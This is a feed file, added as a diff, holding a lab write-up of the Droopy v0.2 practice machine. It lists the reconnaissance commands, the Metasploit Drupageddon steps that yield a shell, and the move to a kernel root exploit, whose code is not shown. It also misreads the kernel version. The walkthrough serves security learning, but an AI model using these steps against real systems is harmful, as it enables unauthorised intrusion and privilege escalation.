@@ -1,0 +1,111 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: drupal | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/drupal/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-08-01T12:30:03-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Droopy:V0.2]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2/"/>
+    <updated>2016-08-01T10:57:14-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Metasploit
+*</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/34992/">Drupal HTTP Parameter Key/Value SQL Injection</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/drooy2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.155 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.155 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.155</code></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>No useful info come out.</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.155/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>still same thing.</p>
+
+<p>check the <a href="http://192.168.41.155">http://192.168.41.155</a></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find the target use <code>Drupal</code></p>
+
+<p>in msfconsole, search drupal, find an interesting exploit <code>exploit/multi/http/drupal_drupageddon</code></p>
+
+<pre><code>msf &gt; use exploit/multi/http/drupal_drupageddon
+msf exploit(drupal_drupageddon) &gt; set rhost 192.168.41.155
+msf exploit(drupal_drupageddon) &gt; exploit 
+</code></pre>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get meterpreter, do command <code>shell</code> to get shell.</p>
+
+<p>use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> get bash</p>
+
+<p>user is www-data, next try to get root</p>
+
+<p><code>uname -a</code></p>
+
+<p><code>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code></p>
+
+<p>the kernel is 3.1.30</p>
+
+<p><code>searchsploit 3.1.30</code></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>upload the exploit, compile and run it, get the root:</p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+</feed>
